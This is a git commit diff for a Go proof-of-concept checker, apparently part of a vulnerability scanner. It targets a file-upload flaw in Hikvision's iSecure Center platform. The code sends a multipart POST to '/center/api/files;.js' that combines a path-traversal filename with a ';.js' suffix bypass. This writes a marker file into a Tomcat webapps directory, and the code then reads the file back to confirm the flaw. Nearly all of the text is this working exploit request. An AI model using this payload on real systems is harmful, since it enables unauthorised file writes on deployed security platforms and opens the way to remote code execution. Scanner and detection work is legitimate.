77825b9b541bd90f4e354b0d9ce543d3ad3c04ac
york-cmd <958913001@qq.com>
2023-06-30 11:12:23 +0800

    海康威视综合安防管理平台文件上传漏洞

--- pocs_go/HIKVISION/HIKVISION_iSecure_Center_api_upload_rce.go
+++ pocs_go/HIKVISION/HIKVISION_iSecure_Center_api_upload_rce.go
@@ -8,7 +8,7 @@ import (
 
 func Hikvision_api_files_rce(u string) bool {
 	payload := `--ea26cdac4990498b32d7a95ce5a5135c
-Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107606.txt"    
+Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/153107607.txt"    
 Content-Type: application/octet-stream
 
 332299402
@@ -18,9 +18,9 @@ Content-Type: application/octet-stream
 	header["Content-Type"] = "multipart/form-data; boundary=ea26cdac4990498b32d7a95ce5a5135c"
 
 	if response, err := pkg.HttpRequset(u+"/center/api/files;.js", "POST", payload, false, header); err == nil {
-		if req2, err := pkg.HttpRequset(u+"/clusterMgr/153107606.txt;.js", "GET", "", false, nil); err == nil {
+		if req2, err := pkg.HttpRequset(u+"/clusterMgr/153107607.txt;.js", "GET", "", false, nil); err == nil {
 			if response.StatusCode == 200 && strings.Contains(req2.Body, "332299402") {
-				pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"/clusterMgr/332299402.txt;.js"))
+				pkg.GoPocLog(fmt.Sprintf("Found vuln hikvision api_file_upload_rce|%s\n", u+"/clusterMgr/153107607.txt;.js"))
 				return true
 			}
 		}
